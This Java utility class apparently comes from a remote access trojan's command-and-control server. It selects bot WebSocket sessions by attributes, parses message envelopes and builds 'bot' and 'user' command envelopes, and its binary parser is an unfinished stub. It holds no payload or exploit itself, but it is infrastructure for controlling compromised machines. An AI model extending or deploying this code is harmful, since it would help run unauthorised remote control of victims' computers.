package devs.alex.sah.rat.c2server.utils;

import devs.alex.sah.rat.c2server.models.Message;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;

public class Utils {

    public static Map<String, WebSocketSession> filter(HashMap<String, Object> filters, Map<String, WebSocketSession> sessions) {
        if(filters.isEmpty()){
            return sessions;
        } else{
            Map<String, WebSocketSession> filteredSessions = new HashMap<>();
            for(Map.Entry<String, WebSocketSession> ws : sessions.entrySet()) {
                if (ws.getValue().getAttributes().entrySet().containsAll(filters.entrySet())){
                    filteredSessions.put(ws.getKey(), ws.getValue());
                }
            }
            return filteredSessions;
        }
    }

    public static Message<String> parseMessage(TextMessage message) throws RuntimeException{
        String envelope;
        int envelopeSize;

        try {
            envelopeSize = Integer.parseInt(message.getPayload().substring(0, message.getPayload().indexOf(':')));
            envelope = message.getPayload().substring(message.getPayload().indexOf(':') + 1, envelopeSize);
        } catch (RuntimeException exception){
            throw new RuntimeException("Extracting envelope error");
        }

        Map<String, String> result = new HashMap<>();
        String[] params = envelope.split("#");
        for (String param: params) {
            String[] keyValue = param.split(":");
            result.put(keyValue[0], keyValue[1]);
        }
        return new Message<>(result, message.getPayload().substring(envelopeSize));
    }


    public static Message<ByteBuffer> parseMessage(BinaryMessage message){
        short envelopeSize = ByteBuffer.wrap(new byte[]{message.getPayload().array()[0], message.getPayload().array()[1]}).getShort();


        //short envelopeSize = (short) (b1<<8 | b2);
        return null;
    }


    private static String lengthCheck(String result){
        if(result.length() <= 97){
            return result.length()+2 + result;
        } else{
            return result.length()+3 + result;
        }
    }

    public static String generateBotEnvelope(String packageType, String module, String request, String RequiredResponse){
        return lengthCheck(":PT:"+packageType+ "#M:"+ module + "#REQ:" + request +"#RPT:"+RequiredResponse);
    }
    public static String generateBotEnvelope(String packageType, String module, String request){
        return lengthCheck(":PT:"+packageType+ "#M:"+ module + "#REQ:" + request);
    }

    public static String generateUserEnvelope(String packageType, String module, String userId, String RequiredResponse){
        return lengthCheck(":PT:"+packageType+ "#M:"+ module + "#UID:" + userId +"#RPT:"+RequiredResponse);
    }
    public static String generateUserEnvelope(String packageType, String module, String userId){
        return lengthCheck(":PT:"+packageType+ "#M:"+ module + "#UID:" + userId);
    }

}
